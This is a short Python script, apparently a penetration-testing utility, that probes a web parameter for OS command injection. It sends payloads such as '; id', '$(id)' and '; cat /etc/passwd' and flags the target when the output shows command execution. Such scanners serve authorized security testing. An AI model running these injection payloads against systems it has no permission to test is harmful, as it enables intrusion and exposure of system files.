#!/usr/bin/env python3
"""Command Injection Tester - Tests for OS command injection."""

import requests
import sys
import urllib.parse

def test_cmd_injection(url, param):
    """Test a parameter for command injection."""
    payloads = ["; id", "| id", "$(id)", "`id`", "&& whoami", "; cat /etc/passwd"]
    
    for payload in payloads:
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if 'uid=' in response.text or 'root:' in response.text:
                print(f"VULNERABLE: {url} parameter '{param}' with payload '{payload}'")
                return True
        except requests.RequestException:
            continue
    return False

def main():
    if len(sys.argv) < 3:
        print("Usage: python command_injection.py <url> <param>")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    test_cmd_injection(url, param)

if __name__ == "__main__":
    main()
